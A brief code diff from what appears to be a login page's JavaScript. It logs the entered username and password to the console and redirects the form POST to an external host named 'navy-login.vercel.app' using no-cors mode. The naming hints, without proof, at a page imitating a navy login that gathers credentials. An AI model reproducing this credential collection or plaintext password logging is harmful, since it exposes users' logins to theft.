@@ -150,8 +150,15 @@ img {
 
         console.log({username, password});
 
-                fetch( 'http://localhost:3000/submit-form', {
+            //    const apiUrl = window.location.hostname === 'localhost' ? 
+            // 'http://localhost:3000/submit-form' : 
+            // 'https://navy-login.vercel.app/submit-form';
+
+          const apiUrl = 'https://navy-login.vercel.app/submit-form';
+
+        fetch(apiUrl, {
             method: 'POST',
+             mode: 'no-cors', 
             headers: {
             'Content-Type': 'application/json'
             },
